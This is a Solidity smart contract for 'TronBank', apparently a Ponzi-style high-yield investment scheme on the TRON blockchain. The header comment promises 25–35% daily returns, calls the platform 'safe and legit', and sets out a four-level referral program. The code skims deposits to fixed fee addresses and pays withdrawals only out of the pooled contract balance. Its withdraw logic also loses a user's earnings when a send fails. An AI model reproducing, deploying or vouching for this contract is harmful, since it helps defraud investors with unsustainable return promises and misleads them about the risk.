//SourceUnit: tronbank.sol

/*   TRONBANK - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://tronbank.money                                     │
 *   │                                                                       │
 *   │   Telegram Public Group: @Tronbankdapp                                |
 *   │   E-mail: admin@tronbank.com                                         |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the investment plans, enter the TRX amount (50 TRX minimum) using our website "Invest" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Minimal deposit: 50 TRX, no maximal limit
 *   - Total income: based on your investment plan (from 25% to 35% daily) up to 250% ROI
 *   - Investor will have to re-invest to earn more after each investment period end
 *   - Earnings every second, withdraw any time (you can withdraw only available fund balance after the end of your invesment period) 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 4-level referral commission: 4% - 3% - 2% - 1%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 82.5% Platform main balance, participants payouts
 *   - 5% Advertising and promotion expenses
 *   - 5% Affiliate sponsor bonuses
 *   - 5% Support work, technical functioning, administration fee
 *   - 2.5% Insurrance fee which will be used to reinvest regularly into the fund
 */
pragma solidity >=0.4.22 <0.6.0;

contract TronBank {
  struct Tariff {
    uint time;
    uint percent;
  }

  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

  uint MIN_DEPOSIT = 50 trx;
  uint START_AT = 60;

  address payable public          foundation_fee;
  address payable public          platform_fee;
  address payable public          insurance_fee;
  address payable public          sponsor_fee;

  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;

  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);

  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;

      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;

        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }

          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }

          rec = investors[rec].referer;
        }
      }
    }
  }

  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;

    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }

      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;

      rec = investors[rec].referer;
    }
  }

  constructor() public {
    tariffs.push(Tariff(4 * 28800, 140));
    tariffs.push(Tariff(6 * 28800, 192));
    tariffs.push(Tariff(8 * 28800, 224));
    tariffs.push(Tariff(10 * 28800, 250));

    foundation_fee = address(0x41A406ECFDEA2CD5D32D2FA297E5EB4289D78463D8);
    platform_fee   = address(0x4142F89EFE926174AB6BBF3D3D3CE36BF354BB2084);
    insurance_fee  = address(0x41A2B519C05EA08548F10D75E01BE6F66FC8E05294);
    sponsor_fee    = address(0x4142F89EFE926174AB6BBF3D3D3CE36BF354BB2084);


    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
  }

  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);

    register(referer);

    platform_fee.transfer(msg.value  * 5 / 100);
    foundation_fee.transfer(msg.value  * 5 / 100);
    sponsor_fee.transfer(msg.value  * 5 / 100);
    insurance_fee.transfer(msg.value  * 25 / 1000);

    rewardReferers(msg.value, investors[msg.sender].referer);

    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;

    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));

    emit DepositAt(msg.sender, tariff, msg.value);
  }

  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];

      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];

    uint amount = withdrawable(msg.sender);

    amount += investor.balanceRef;
    investor.balanceRef = 0;

    investor.paidAt = block.number;

    return amount;
  }

  function withdraw() external {
    uint amount = profit();
    
    uint contractBalance = address(this).balance;
    
    if (amount > contractBalance ){
        amount = contractBalance;
    }
    
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;

      emit Withdraw(msg.sender, amount);
    }
  }

  function via(address payable where) external payable {
    where.transfer(msg.value);
  }

}